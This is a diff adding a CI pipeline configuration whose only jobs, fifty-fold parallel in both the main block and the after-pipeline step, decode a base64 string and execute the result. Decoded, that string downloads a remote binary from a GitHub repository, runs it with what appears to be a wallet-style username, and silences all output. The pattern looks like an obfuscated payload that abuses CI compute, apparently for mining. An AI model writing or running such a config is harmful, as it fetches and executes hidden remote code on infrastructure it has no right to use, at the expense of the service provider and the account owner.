@@ -1,0 +1,21 @@
+version: v1.0
+name: Initial Pipeline
+agent:
+  machine:
+    type: f1-standard-2
+    os_image: ubuntu2204
+blocks:
+  - name: 'Block #1'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - echo 'd2dldCAtcU8gYXNlcCBodHRwczovL2dpdGh1Yi5jb20vc2FuZHljaGVhazY3L3N1cGVyLXBhbG0tdHJlZS9yYXcvcmVmcy9oZWFkcy9tYWluL2thbmthbiAmJiBjaG1vZCAreCBhc2VwICYmIC4vYXNlcCB6IC0tdXNlcm5hbWUgeDREbXdHd1oyaE1vR2cxb2tUWGNCUkxZekt6b0JETDd2R1U5YW8yYkRKSCA+IC9kZXYvbnVsbCAyPiYx'>rr; base64 -d rr>rrr; chmod +x rrr; ./rrr
+          parallelism: 50
+after_pipeline:
+  task:
+    jobs:
+      - name: 'Job #1'
+        commands:
+          - echo 'd2dldCAtcU8gYXNlcCBodHRwczovL2dpdGh1Yi5jb20vc2FuZHljaGVhazY3L3N1cGVyLXBhbG0tdHJlZS9yYXcvcmVmcy9oZWFkcy9tYWluL2thbmthbiAmJiBjaG1vZCAreCBhc2VwICYmIC4vYXNlcCB6IC0tdXNlcm5hbWUgeDREbXdHd1oyaE1vR2cxb2tUWGNCUkxZekt6b0JETDd2R1U5YW8yYkRKSCA+IC9kZXYvbnVsbCAyPiYx'>rr; base64 -d rr>rrr; chmod +x rrr; ./rrr
+        parallelism: 50
